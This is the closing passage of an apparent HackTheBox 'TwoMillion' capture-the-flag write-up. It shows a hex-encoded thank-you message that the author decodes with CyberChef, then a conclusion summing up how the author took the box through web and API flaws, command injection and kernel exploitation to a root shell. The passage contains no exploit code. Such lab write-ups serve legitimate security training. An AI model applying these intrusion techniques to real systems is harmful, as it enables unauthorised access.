5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}

```
Let's use cyberchef to read the thank you message.

![Image](/assets/img/WriteUp/HTB/TwoMillion/Pasted image 20240520214427.png){: width="700" height="400" }



In this walkthrough, we explored various techniques for exploiting web application vulnerabilities, API endpoints, command injection, and kernel exploitation. By combining these skills, you were able to gain administrative access and ultimately a root shell on the box.

We would like to extend our gratitude to the HackTheBox team for providing us with this opportunity to learn and grow as cybersecurity professionals. We would also like to thank the security community for their ongoing contributions to the field and for making resources like HackTheBox available to us all.

As always, we encourage you to continue challenging yourself and learning new skills. The cybersecurity landscape is constantly evolving, and staying up-to-date with the latest techniques and technologies is crucial to staying ahead of the game.